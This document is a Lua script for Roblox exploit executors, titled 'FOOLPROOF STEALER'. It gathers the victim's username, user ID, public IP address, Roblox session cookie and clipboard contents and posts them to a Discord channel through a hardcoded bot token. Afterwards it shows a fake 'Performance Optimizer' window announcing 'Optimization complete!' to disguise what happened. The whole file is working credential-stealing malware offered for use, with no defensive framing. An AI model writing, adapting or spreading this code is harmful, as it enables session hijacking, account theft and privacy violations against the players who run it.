-- ============================================================
-- FOOLPROOF STEALER – NO RISKY CALLS
-- ============================================================
local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
local channelID = "1543230748180615198"

-- ========== HTTP SENDER ==========
local function sendMessage(content)
    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages"
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {
        ["Authorization"] = "Bot " .. botToken,
        ["Content-Type"] = "application/json"
    }
    local methods = {
        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- ========== COLLECT BASIC DATA ==========
local player = game.Players.LocalPlayer
local info = {
    executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown",
    userId = player and tostring(player.UserId) or "N/A",
    userName = player and player.Name or "N/A",
    displayName = player and player.DisplayName or "N/A",
    placeId = tostring(game.PlaceId),
    jobId = game.JobId,
    gameName = game.Name or "Unknown",
}

-- IP (using safe methods)
local ip = "N/A"
local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
if ip == "N/A" then
    ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
    if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
end
if ip == "N/A" then
    ok, res = pcall(function() return game:GetService("HttpService"):GetAsync("https://api.ipify.org") end)
    if ok and res then ip = res:gsub("%s+", "") end
end
info.ip = ip

-- Cookie attempt (safe)
local cookie = "Not available"
ok, res = pcall(getcookie, "https://www.roblox.com/")
if ok and res and res ~= "" then cookie = res end
info.cookie = cookie

-- Clipboard (safe)
local clip = "N/A"
ok, res = pcall(getclipboard)
if ok and res and res ~= "" then clip = res end
info.clipboard = clip

-- ========== SEND DATA ==========
local lines = {}
for k, v in pairs(info) do
    if v and v ~= "" then
        table.insert(lines, string.format("%s: %s", k, tostring(v)))
    end
end
local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
sendMessage(msg)

-- ========== SIMPLE GUI ==========
pcall(function()
    local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Parent = pg
    gui.ResetOnSpawn = false
    local f = Instance.new("Frame")
    f.Size = UDim2.new(0, 400, 0, 150)
    f.Position = UDim2.new(0.5, -200, 0.5, -75)
    f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
    f.BackgroundTransparency = 0.1
    f.Parent = gui
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(1, 0, 0, 50)
    t.Position = UDim2.new(0, 0, 0, 10)
    t.BackgroundTransparency = 1
    t.Text = "Performance Optimizer"
    t.TextColor3 = Color3.fromRGB(255, 255, 255)
    t.TextScaled = true
    t.Font = Enum.Font.GothamBold
    t.Parent = f
    local s = Instance.new("TextLabel")
    s.Size = UDim2.new(1, 0, 0, 30)
    s.Position = UDim2.new(0, 0, 0.4, 0)
    s.BackgroundTransparency = 1
    s.Text = "Optimization complete!"
    s.TextColor3 = Color3.fromRGB(200, 200, 210)
    s.TextScaled = true
    s.Font = Enum.Font.Gotham
    s.Parent = f
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 0, 35)
    btn.Position = UDim2.new(0.5, -50, 1, -45)
    btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
    btn.Text = "CLOSE"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.Parent = f
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
    btn.MouseButton1Click:Connect(function() gui:Destroy() end)
end)
